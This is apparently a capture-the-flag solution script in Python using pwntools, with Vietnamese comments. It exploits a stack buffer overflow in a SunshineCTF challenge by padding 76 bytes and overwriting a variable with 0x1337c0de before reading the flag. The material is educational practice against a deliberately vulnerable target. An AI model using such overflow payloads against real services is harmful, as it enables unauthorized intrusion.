from pwn import *

# --- Cấu hình kết nối ---
HOST = 'chal.sunshinectf.games'
PORT = 25601

# --- Xây dựng Payload ---

# 1. Phần đệm để lấp đầy buffer local_58
# Kích thước của buffer là 76 byte
padding = b'A' * 76

# 2. Giá trị mục tiêu chúng ta muốn ghi đè vào biến local_c
# p32() sẽ tự động đóng gói số 0x1337c0de thành 4 byte theo thứ tự little-endian
target_value = p32(0x1337c0de)

# 3. Kết hợp lại thành payload hoàn chỉnh
payload = padding + target_value

log.info(f"Payload được tạo: {payload}")
log.info(f"Độ dài payload: {len(payload)} bytes") # Sẽ là 76 + 4 = 80 bytes

# --- Tương tác với server ---
try:
    # Kết nối đến server
    p = remote(HOST, PORT)
    
    # Đợi server gửi ra dòng prompt
    p.recvuntil(b"Enter Dexter's password: ")
    
    # Gửi payload của chúng ta. sendline() sẽ tự động thêm ký tự newline (\n)
    # để hàm gets() kết thúc việc đọc.
    p.sendline(payload)
    
    # Chuyển sang chế độ tương tác để xem kết quả (flag) mà server trả về
    p.interactive()
    
except Exception as e:
    log.error(f"Đã xảy ra lỗi: {e}")